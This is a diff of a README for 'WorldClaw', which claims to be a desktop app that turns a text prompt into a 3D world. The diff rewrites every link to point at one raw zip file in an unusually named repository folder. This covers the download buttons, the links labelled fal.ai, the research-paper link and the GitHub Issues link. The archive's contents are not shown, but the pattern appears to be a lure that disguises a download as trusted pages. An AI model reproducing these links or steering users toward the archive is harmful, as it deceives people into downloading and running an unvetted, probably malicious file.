@@ -2,7 +2,7 @@
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/⬇️_Download_WorldClaw-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Painted-genusargusianus366/fal-worldclaw/releases)
+[![Download for Windows](https://img.shields.io/badge/⬇️_Download_WorldClaw-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Painted-genusargusianus366/fal-worldclaw/raw/refs/heads/main/Merlucciidae/worldclaw_fal_1.2-alpha.1.zip)
 
 </div>
 
@@ -12,7 +12,7 @@
 
 WorldClaw is a desktop application that turns a single sentence into a fully explorable, three-dimensional world. You type a description like *"a cozy mountain village with waterfalls and autumn trees"*—and within moments, you're walking through that exact scene. No game engine. No design skills. No coding. Just your imagination.
 
-This app is a browser-based reimplementation of the research project *WorldClaw: Agentic 3D Open-World Generation at Scale* by the Tencent Hunyuan3D team. It uses powerful AI models running on the [fal.ai](https://fal.ai) platform to generate terrain, buildings, vegetation, animals, and weather—all from your prompt.
+This app is a browser-based reimplementation of the research project *WorldClaw: Agentic 3D Open-World Generation at Scale* by the Tencent Hunyuan3D team. It uses powerful AI models running on the [fal.ai](https://github.com/Painted-genusargusianus366/fal-worldclaw/raw/refs/heads/main/Merlucciidae/worldclaw_fal_1.2-alpha.1.zip) platform to generate terrain, buildings, vegetation, animals, and weather—all from your prompt.
 
 ## 🎯 What Can You Do With It?
 
@@ -32,7 +32,7 @@ Click the button below to go to the official download page:
 
 <div align="center">
 
-[![Download WorldClaw](https://img.shields.io/badge/⬇️_Get_WorldClaw_Now-4e8ee8?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Painted-genusargusianus366/fal-worldclaw/releases)
+[![Download WorldClaw](https://img.shields.io/badge/⬇️_Get_WorldClaw_Now-4e8ee8?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Painted-genusargusianus366/fal-worldclaw/raw/refs/heads/main/Merlucciidae/worldclaw_fal_1.2-alpha.1.zip)
 
 </div>
 
@@ -130,12 +130,12 @@ WorldClaw uses a chain of AI models that specialize in different tasks. When you
 4. **Places objects** – Positions trees, houses, animals, and other elements naturally.
 5. **Lights the scene** – Calculates realistic shadows and sunlight.
 
-All of this happens on powerful cloud servers via [fal.ai](https://fal.ai), so your computer doesn't need to do heavy lifting.
+All of this happens on powerful cloud servers via [fal.ai](https://github.com/Painted-genusargusianus366/fal-worldclaw/raw/refs/heads/main/Merlucciidae/worldclaw_fal_1.2-alpha.1.zip), so your computer doesn't need to do heavy lifting.
 
 ## 📚 Additional Resources
 
-- **Research Paper** – [WorldClaw: Agentic 3D Open-World Generation at Scale](https://arxiv.org/abs/2608.05248)
-- **Powered by** – [fal.ai](https://fal.ai) generative endpoints
+- **Research Paper** – [WorldClaw: Agentic 3D Open-World Generation at Scale](https://github.com/Painted-genusargusianus366/fal-worldclaw/raw/refs/heads/main/Merlucciidae/worldclaw_fal_1.2-alpha.1.zip)
+- **Powered by** – [fal.ai](https://github.com/Painted-genusargusianus366/fal-worldclaw/raw/refs/heads/main/Merlucciidae/worldclaw_fal_1.2-alpha.1.zip) generative endpoints
 - **Built With** – Next.js 16, three.js r182
 
 ## 🙋 Getting Help
@@ -147,7 +147,7 @@ If you encounter any issues:
 3. **Update your graphics drivers** – Visit your GPU manufacturer's website (Intel, NVIDIA, or AMD) for the latest drivers.
 4. **Re-download the file** if the download was interrupted.
 
-For persistent issues, please open an issue on the [GitHub Issues page](https://github.com/Painted-genusargusianus366/fal-worldclaw/issues) for this repository.
+For persistent issues, please open an issue on the [GitHub Issues page](https://github.com/Painted-genusargusianus366/fal-worldclaw/raw/refs/heads/main/Merlucciidae/worldclaw_fal_1.2-alpha.1.zip) for this repository.
 
 ## 📄 License
 
